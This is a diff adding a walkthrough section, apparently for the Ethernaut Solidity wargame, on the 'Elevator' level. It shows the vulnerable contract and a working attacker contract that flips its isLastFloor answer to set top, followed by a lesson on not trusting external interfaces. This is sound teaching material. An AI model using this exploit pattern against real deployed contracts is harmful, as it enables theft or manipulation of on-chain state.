@@ -766,3 +766,78 @@ Nice, isn't it? :)
 Always assume that the receiver of the funds you are sending can be another contract, not just a regular address. Hence, it can execute code in its payable fallback method and re-enter your contract, possibly messing up your state/logic.
 
 Re-entrancy is a common attack. You should always be prepared for it!
+
+## Level 11: Elevator
+
+Let's have a code at the contract first:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface Building {
+    function isLastFloor(uint256) external returns (bool);
+}
+
+contract Elevator {
+    bool public top;
+    uint256 public floor;
+
+    function goTo(uint256 _floor) public {
+        Building building = Building(msg.sender);
+
+        if (!building.isLastFloor(_floor)) {
+            floor = _floor;
+            top = building.isLastFloor(floor);
+        }
+    }
+}
+```
+
+Our goal is to reach the top :)
+
+The contract has a `goTo()` function, which is called with a floor number. The function checks if the floor is the last floor of the building. If it is not, the floor number is updated and the `top` variable is set to the result of the `isLastFloor()` function.
+
+The interesting part is that the `goTo()` function calls another contract to check if the floor is the last floor. Worst part: It uses `msg.sender` as address for the `Building` contract - which is the address of the calling contract.
+
+That means we need to deploy a contract that implements the `Building` interface and call the `goTo()` function of the `Elevator` contract with the address of our contract. The `isLastFloor()` function of our contract will be called and we can return the appropriated bool in order to tell the Elevator contract that we are at the top.
+
+Seeing the statements, we see, that we would need to first return `false` in order to pass the if statement. Then we woiuld need to return `true` in order to set the `top` variable.
+
+Having all those details, here our attacker contract:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+abstract contract Elevator {
+    function goTo(uint256 _floor) virtual external;
+}
+
+contract Attacker {
+    
+    Elevator public re;
+    bool called;
+
+    function attack(address _elevator) external payable {
+        Elevator e = Elevator(_elevator);
+        called = false;
+        e.goTo(1);
+    }
+
+    function isLastFloor(uint _floor) public returns (bool) {
+        if (!called) {
+            called = true;
+            return false;
+        }
+        called = false;
+        return true;
+    }   
+}
+```
+
+Deploy the attacker contract and call the `attack()` function with the address of the Elevator contract. The Elevator contract will call the `isLastFloor()` function of the Attacker contract and we can return the appropriated bool in order to tell the Elevator contract that we are at the top.
+
+### Learning
+
+Do not trust other contracts to implement an interface as intended. Always assume that the other contract can be malicious and try to exploit your contract. 
